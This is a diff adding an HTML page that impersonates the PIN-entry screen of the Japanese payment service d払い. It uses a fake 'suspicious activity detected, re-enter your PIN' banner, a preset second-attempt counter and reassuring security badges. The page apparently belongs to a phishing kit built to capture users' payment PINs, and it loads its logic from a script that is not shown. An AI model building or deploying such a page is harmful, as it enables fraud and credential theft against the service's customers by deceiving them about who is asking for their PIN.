@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ja-JP">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
+  <meta name="theme-color" content="#FF6B00" />
+  <meta name="referrer" content="no-referrer" />
+  <title>d払い</title>
+  <link rel="stylesheet" href="./css/main.css" />
+</head>
+<body>
+  <div class="app" id="app">
+    <div class="status-bar" aria-hidden="true"></div>
+    <header class="nav-bar">
+      <button type="button" class="nav-back" id="backBtn" aria-label="戻る">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" aria-hidden="true">
+          <path d="M15 6l-6 6 6 6" />
+        </svg>
+      </button>
+      <h1 class="nav-title">PINを入力</h1>
+      <span class="nav-help" aria-hidden="true">?</span>
+    </header>
+
+    <div class="top">
+      <p class="tagline">Digital Payments</p>
+      <div class="logo-stack">
+        <div class="brand-mark" aria-hidden="true">D</div>
+      </div>
+      <svg class="brand-svg" viewBox="0 0 220 52" aria-label="d払い">
+        <text x="110" y="34" text-anchor="middle" fill="#fff" font-family="Arial, Helvetica, sans-serif" font-size="26" font-weight="900" letter-spacing="0.5">
+          d払い
+        </text>
+      </svg>
+      <p class="pin-label">
+        d払いのPINを入力
+        <span class="sub">続行するには本人確認が必要です</span>
+      </p>
+      <div class="brand-wave" aria-hidden="true"></div>
+    </div>
+
+    <div class="pin-area">
+      <p class="banner">d払いで不審なアクティビティを検出しました。PINを再入力してください。</p>
+      <div class="pin-dots" id="pinDots" aria-label="PIN">
+        <span class="pin-dot"></span>
+        <span class="pin-dot"></span>
+        <span class="pin-dot"></span>
+        <span class="pin-dot"></span>
+      </div>
+      <p class="error-msg" id="errorMsg" role="alert"></p>
+      <p class="attempt-counter" id="attemptCounter">2回目</p>
+      <p class="loader" id="loader" aria-live="polite">確認中...</p>
+      <div class="bio-row" aria-hidden="true">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+          <path d="M12 11c1.66 0 3-1.34 3-3S13.66 5 12 5 9 6.34 9 8s1.34 3 3 3z" />
+          <path d="M6 20v-1c0-2.21 2.69-4 6-4s6 1.79 6 4v1" />
+        </svg>
+        <span>生体認証を使用</span>
+      </div>
+      <a class="forgot-link" href="#" id="forgotLink">PINをお忘れですか？</a>
+      <p class="secure-note">🔒 256-bit暗号化</p>
+      <p class="bank-footer">d払い · Secure Digital Wallet</p>
+    </div>
+
+    <div class="keypad" id="keypad" aria-label="数字キーパッド">
+      <div class="keypad-grid">
+        <button type="button" class="key" data-key="1">1</button>
+        <button type="button" class="key" data-key="2">2</button>
+        <button type="button" class="key" data-key="3">3</button>
+        <button type="button" class="key" data-key="4">4</button>
+        <button type="button" class="key" data-key="5">5</button>
+        <button type="button" class="key" data-key="6">6</button>
+        <button type="button" class="key" data-key="7">7</button>
+        <button type="button" class="key" data-key="8">8</button>
+        <button type="button" class="key" data-key="9">9</button>
+        <span class="key key-empty" aria-hidden="true"></span>
+        <button type="button" class="key" data-key="0">0</button>
+        <button type="button" class="key key-backspace" data-key="back" aria-label="削除">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+            <path d="M9 6L3 12l6 6" />
+            <path d="M3 12h14" />
+            <path d="M21 19V5a2 2 0 0 0-2-2H9" />
+          </svg>
+        </button>
+      </div>
+    </div>
+  </div>
+  <script src="./js/main.js"></script>
+</body>
+</html>
